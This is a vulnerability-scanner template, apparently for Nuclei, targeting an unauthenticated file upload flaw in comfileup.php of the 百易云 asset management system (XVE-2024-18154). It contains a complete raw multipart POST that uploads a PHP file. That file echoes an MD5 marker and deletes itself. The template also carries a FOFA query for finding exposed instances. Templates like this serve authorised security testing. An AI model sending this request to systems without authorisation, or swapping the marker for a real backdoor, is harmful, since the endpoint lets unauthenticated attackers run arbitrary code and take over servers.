id: zgy-comfileup-upload

info:
  name: 百易云资产管理运营系统 comfileup.php 前台文件上传漏洞
  author: qwtd
  severity: critical
  reference:
    - https://github.com/wy876/POC/blob/main/%E8%B5%84%E7%AE%A1%E4%BA%91/%E8%B5%84%E7%AE%A1%E4%BA%91comfileup.php%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(XVE-2024-18154).md
  description: |-
    百易云资产管理运营系统 comfileup.php 接口存在文件上传漏洞，未经身份验证的攻击者通过漏洞上传恶意后门文件，执行任意代码，从而获取到服务器权限。
  metadata:
    fofa: body="不要着急，点此" || title="资管云"
  tags: 百易云资产管理运营系统

http:
  - raw:
      - |
        @timeout: 30s
        POST /comfileup.php HTTP/1.1
        Host:{{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0)Gecko/20100101 Firefox/127.0
        Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Cookie: cna=JtMCH7NgWFYCAXBg5XNzopCe
        Upgrade-Insecure-Requests: 1
        Priority: u=1
        Content-Type: multipart/form-data; boundary=--------1110146050
        Content-Length: 117

        ----------1110146050
        Content-Disposition: form-data; name="file";filename="{{randstr_1}}.php"

        <?php echo md5(123456);unlink(__FILE__);?> 
        ----------1110146050--

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "vpath"
          - "fsize"
          - "fguid"
          - "fname"
        condition: and